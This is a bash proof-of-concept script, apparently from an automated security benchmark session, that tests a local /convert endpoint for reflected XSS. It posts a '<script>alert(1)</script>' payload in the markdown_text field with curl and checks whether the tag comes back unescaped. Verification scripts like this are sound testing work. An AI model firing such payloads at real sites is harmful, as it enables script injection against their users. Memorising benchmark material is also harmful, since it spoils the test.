#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /convert endpoint via markdown_text parameter. Injects a script tag using curl's data-urlencode.
# Target: ./repo
# Created: 2025-11-04T17:29:39.692Z
# Session: benchmark-XBEN-033-24-mhkubvue

# Reflected XSS via Script Tag in Markdown Text Input POC - Version 2
# Target: /convert endpoint, markdown_text parameter
# Vulnerability: User-supplied script tags are rendered without sanitization

TARGET_URL="http://localhost:80/convert"
PAYLOAD='<script>alert(1)</script>'

echo "[*] Testing Reflected XSS on /convert endpoint"
echo "[*] Target URL: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# URL encode using printf
ENCODED_PAYLOAD=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)

echo "[*] Encoded Payload: $ENCODED_PAYLOAD"
echo ""

# Send the XSS payload via POST with proper headers
echo "[*] Sending XSS payload via POST..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  --data-urlencode "markdown_text=$PAYLOAD" \
  --data-urlencode "url=" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if the script tag is present in the response without escaping
if echo "$RESPONSE" | grep -q '<script>alert(1)</script>'; then
    echo "[+] VULNERABLE: Script tag found unescaped in response!"
    echo "[+] The markdown_text parameter is vulnerable to reflected XSS"
    exit 0
else
    echo "[-] Script tag not found in response or was escaped"
    echo "[*] Checking for escaped HTML entities..."
    if echo "$RESPONSE" | grep -q '&lt;script&gt;' || echo "$RESPONSE" | grep -q '&amp;'; then
        echo "[-] HTML appears to be escaped - not vulnerable"
        exit 1
    fi
    echo "[*] Full response for analysis:"
    echo "$RESPONSE"
    exit 1
fi